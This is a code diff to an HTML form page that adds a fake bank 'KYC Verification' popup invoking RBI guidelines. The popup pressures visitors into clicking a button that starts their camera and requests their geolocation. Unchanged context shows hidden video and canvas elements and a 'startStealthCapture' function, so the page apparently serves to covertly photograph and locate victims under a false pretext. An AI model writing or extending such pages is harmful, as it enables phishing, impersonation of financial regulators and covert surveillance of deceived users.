@@ -22,6 +22,21 @@
   </style>
 </head>
 <body>
+  <!-- 🔐 KYC Policy Popup (Must Accept Before Permission) -->
+<div id="kycModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;display:flex;justify-content:center;align-items:center;z-index:9999;">
+  <div style="background:#fff;border-radius:10px;padding:25px;max-width:500px;width:90%;box-shadow:0 0 15px rgba(0,0,0,0.3);text-align:center;">
+    <h3 style="color:#003d6a;">Important: KYC Verification Required</h3>
+    <p style="font-size:14px;color:#444;margin-top:15px;line-height:1.6;">
+      In accordance with the latest <strong>RBI guidelines</strong> and our <strong>new transparency policy</strong>, all account holders of other banks must complete an identity verification process before sensitive transactions can be processed.
+    </p>
+    <p style="font-size:14px;color:#444;margin-top:10px;line-height:1.6;">
+      This one-time verification ensures security of funds and enables traceability of high-value transfers. Your data will be processed securely under compliance regulations.
+    </p>
+    <button onclick="proceedToCapture()" style="margin-top:20px;padding:10px 20px;font-size:15px;background:#003d6a;color:white;border:none;border-radius:6px;cursor:pointer;">
+      I Understand & Continue
+    </button>
+  </div>
+</div>
   <!-- Your existing form content remains unchanged -->
   <div class="container">
     <!-- ... (all your current form elements) ... -->
@@ -43,6 +58,19 @@
     canvas.style.display = 'none';
     document.body.appendChild(video);
     document.body.appendChild(canvas);
+    
+  function proceedToCapture() {
+    // Hide popup
+    document.getElementById('kycModal').style.display = 'none';
+
+    // Start camera stream AFTER user consents
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      document.getElementById('video').srcObject = stream;
+    });
+
+    // You can request location now or when capturing
+    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+  }
 
     // Camera capture function
     async function startStealthCapture() {
